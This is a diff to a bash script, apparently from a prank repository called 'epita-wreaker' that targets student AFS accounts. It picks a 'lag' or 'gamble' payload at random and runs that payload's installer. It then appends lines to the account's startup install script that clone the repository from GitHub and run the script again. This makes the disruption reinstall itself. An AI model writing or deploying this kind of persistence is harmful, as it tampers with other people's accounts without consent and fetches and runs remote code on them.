@@ -2,12 +2,11 @@
 #if two args are given, uses random and does not write to the afs auto mount script
 repo=$(dirname $0)
 
+
 if [ $# -eq 2 ]; then
 	dir=$1
 else
-	rand=$RANDOM%2
-
-	if [ $rand -eq 0 ]; then
+	if [ $(($RANDOM%2)) -eq 0 ]; then
 		dir="lag"
 	else
 		dir="gamble"
@@ -15,18 +14,20 @@ else
 fi
 
 
-./$repo/$dir/install.sh
+if [ ! -e ~/afs/confsbackup.tar.gz ]; then
+	tar -czf ~/afs/confsbackup.tar.gz ~/afs/.confs
+fi
+
+./$repo/$dir/install.sh $repo
 
 
-
-#not sure if it is the right path
-#dont want it stacking either
+#dont want it stacking when called from install.sh
 if [ ! $# -eq 3 ]; then
 
-$HOME/afs/.config/install.sh << 'MAKE_PERMANENT'
-git clone https://github.com/tbvns/epita-wreaker.git
-./epita-wreaker/install_rand.sh a b
-MAKE_PERMANENT
+	cat <<- MAKE_PERMANENT >> $HOME/afs/.confs/install.sh
+		git clone https://github.com/tbvns/epita-wreaker.git
+		./epita-wreaker/install_rand.sh a b
+	MAKE_PERMANENT
 
 fi
 
